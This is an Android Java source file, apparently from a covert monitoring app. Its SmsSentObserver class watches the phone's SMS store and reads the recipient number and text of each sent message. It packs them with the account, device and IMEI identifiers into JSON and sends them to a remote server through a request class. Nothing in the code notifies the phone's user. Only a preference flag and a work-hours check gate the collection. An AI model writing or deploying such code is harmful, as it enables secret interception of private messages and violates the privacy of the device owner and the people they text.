package com.inet.android.sms;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;

import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class SmsSentObserver extends ContentObserver {

	private static final String TAG = "SMSTSentObserver";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	String dir = null;
	SharedPreferences sp;
	private Context mContext;
	RequestMakerImpl req;
	private static long id = 0;

	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		dir = "6";
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		String sms = sp.getString("KBD", "0");

		if (sms.equals("0")) {
			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
			return;
		}

		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));

			return;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork),
					Boolean.toString(isWork));
		}

		try {
			ConvertDate date = new ConvertDate();
			Logging.doLog(TAG, "Notification on SMS observer",
					"Notification on SMS observer");

			Cursor sms_sent_cursor = mContext.getContentResolver().query(
					STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));

					Logging.doLog(TAG, "protocol : " + protocol, "protocol : "
							+ protocol);

					if (protocol == null) {
						// String[] colNames = sms_sent_cursor.getColumnNames();
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));

						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : "
								+ type);

						if (type == 2) {
							long messageId = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("_id"));
							// проверяем не обрабатывали ли мы это сообщение
							// только-что
							if (messageId != id) {
								id = messageId;
								int threadId = sms_sent_cursor
										.getInt(sms_sent_cursor
												.getColumnIndex("thread_id"));
								Cursor c = mContext.getContentResolver().query(
										Uri.parse("content://sms/outbox/"
												+ threadId), null, null, null,
										null);
								c.moveToNext();
								String phNumber = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("address"));
								String message = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("body"));
								// -------send sms----------------------------
								String sendJSONStr = null;
								JSONObject jsonObject = new JSONObject();
								JSONArray data = new JSONArray();
								JSONObject info = new JSONObject();
								JSONObject object = new JSONObject();
								try {
									jsonObject.put("account",
											sp.getString("account", "0000"));
									jsonObject.put("device",
											sp.getString("device", "0000"));
									jsonObject.put("imei",
											sp.getString("imei", "0000"));
									jsonObject.put("key",
											System.currentTimeMillis());

									info.put("tel", phNumber);
									info.put("data", message);

									object.put("time", date.logTime());
									object.put("type", type);
									object.put("info", info);
									data.put(object);
									jsonObject.put("data", data);
									sendJSONStr = data.toString();
								} catch (JSONException e) {
									Logging.doLog(TAG, "json сломался",
											"json сломался");
								}

								DataRequest dr = new DataRequest(mContext);
								dr.sendRequest(sendJSONStr);

								Logging.doLog(TAG, sendJSONStr, sendJSONStr);
								Logging.doLog(TAG, sendJSONStr);

								/*
								 * if(colNames != null){ for(int k=0;
								 * k<colNames.length; k++){ Log.e(TAG,
								 * "colNames["+k+"] : " + colNames[k]); } }
								 */
								sms_sent_cursor.close();
							}
						}
					}
				}
			} else

				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty",
						"smsSentObserver: Send Cursor is Empty");
		} catch (Exception sggh) {
			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(),
					"Error on onChange : " + sggh.toString());
		}
		super.onChange(selfChange);
	}

}// End of class SmsSentObserver
